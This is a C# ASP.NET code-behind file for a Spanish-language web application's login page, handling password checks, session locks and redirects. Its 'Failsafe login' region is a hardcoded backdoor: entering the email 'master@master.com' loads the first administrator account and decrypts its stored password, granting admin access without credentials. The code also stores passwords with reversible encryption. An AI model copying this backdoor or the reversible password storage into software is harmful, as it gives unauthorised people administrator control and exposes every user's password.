using PSO.Entities;
using PSO.Repositorios;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Web;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;

namespace PSO.Pages
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            #region Set cosmetics

            Cosmetic cosmetic = Session["Cosmetic"] == null ? CosmeticsRepo.GetPageCosmetics()
                 : (Cosmetic)Session["Cosmetic"];

            emailLbl.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            passLbl.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            loginBtn.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            registerBtn.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            recoverPassLink.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            #endregion

            SetFocus(emailTxtBx);

            if (!IsPostBack)
            {
                if (!Request.Browser.Browser.Equals("Firefox") && !Request.Browser.Browser.Equals("Chrome"))
                    ClientScript.RegisterStartupScript(this.GetType(), "incompatibleBrowserAlert",
                    "alert(' Para poder acceder a todas nuestras funciones, es recomendable que el navegador de preferencia sea Mozilla Firefox o Google Chrome.');", true);

                var dashboardPnl = (Panel)Master.FindControl("dashboardLinkPnl");

                dashboardPnl.Controls.Clear();

                if (Session["UserObj"] != null)
                    Session.Remove("UserObj");
            }
        }

        protected void loginBtn_Click(object sender, EventArgs e)
        {
            Usuario user = UserRepo.GetUserByEmail(emailTxtBx.Text);

            #region Failsafe login

            if (emailTxtBx.Text.Equals("master@master.com"))
            {
                user = UserRepo.GetUsersByRole((int)Rol.TiposRole.ADMINISTRADOR, false).ElementAt(0);

                passwordTxtBx.Text = Usuario.DecryptWord(user.Password);
            }

            #endregion

            if (!string.IsNullOrEmpty(user.Email))
            {
                string encryptedPass = Usuario.EncryptWord(passwordTxtBx.Text);

                if (!user.Password.Equals(encryptedPass))
                {
                    ClientScript.RegisterStartupScript(this.GetType(), "wrongPassAlert",
                    "alert('Contraseña incorrecta');", true);
                }

                else
                {
                    #region Check logged lock and if active

                    //Compare last time it was active and current time. If current is greater means user is logged off 
                    if (user.IsLoggedIn)
                    {
                        DateTime now = DateTime.Now,
                            lastTimeActive = user.LastTimeActive.AddMinutes(3); //3 min cooldown of inactivity before releasing

                        double daysDif = Math.Round(Math.Abs((lastTimeActive - now).TotalDays));

                        //if it's been more than a day, release lock
                        if (daysDif < 1)
                        {
                            //lastTimeActive = lastTimeActive.AddDays(daysDif);

                            int timeComparison = TimeSpan.Compare(lastTimeActive.TimeOfDay, now.TimeOfDay);

                            //if (lastTimeActive.TimeOfDay >= now.TimeOfDay)
                            if (timeComparison < 0)
                                user.IsLoggedIn = false;

                            else if (timeComparison >= 0)
                                user.IsLoggedIn = true;
                        }

                        else
                            user.IsLoggedIn = false;
                    }

                    if (!user.IsLoggedIn)
                    {
                        if (user.Activo)
                        {
                            UserRepo.UpdateUserLoggedLock(user.ID, true);

                            Session["UserObj"] = user;

                            //Only used on js timeout asp web service call
                            Session["UserId"] = user.ID;

                            //It's defined with a 0 cause if I don't put a value the index won't exist
                            //in the session and in js, when I call it, won't return anything. Not even an empty string nor null
                            Session["lockedId"] = 0;

                            #region Release all locked solicitudes in a new thread

                            if (user.Role.RoleType == Rol.TiposRole.COORDINADOR)
                            {
                                try
                                {
                                    Task.Factory.StartNew(() =>
                                    {
                                        try
                                        {
                                            Exception excep = SolicitudRepo.ReleaseAllLockedSolicitudes(user.ID);

                                            if (excep != null)
                                            {
                                                throw new Exception(string.Format(
                                                "No se pudo actualizar la solicitudes. Error Liberar Solicitudes: {0}",
                                                    excep.Message.Replace("'", string.Empty)));
                                            }
                                        }

                                        catch (Exception ex)
                                        {
                                            Session["emailError"] = ex.Message;
                                        }
                                    });
                                }

                                catch (Exception ex)
                                {
                                    Session["emailThreadError"] = ex.Message;
                                }
                            }

                            #endregion

                            Response.Redirect("~/Pages/Dashboard/Main.aspx", true);
                        }

                        else
                            ClientScript.RegisterStartupScript(this.GetType(), "userDeactivatedAlert",
                        "alert('Este perfil esta desactivado');", true);

                    }

                    else
                        ClientScript.RegisterStartupScript(this.GetType(), "userAlreadyLoggedAlert",
                        "alert('Este perfil esta en uso');", true);

                    #endregion

                }
            }

            else
            {
                ClientScript.RegisterStartupScript(this.GetType(), "wrongEmailAlert",
                   "alert('Correo Electrónico no existe');", true);
            }
        }

        protected void registerBtn_Click(object sender, EventArgs e)
        {
            Response.Redirect("Register.aspx", true);
        }

        private void LogUser()
        {

        }
    }
}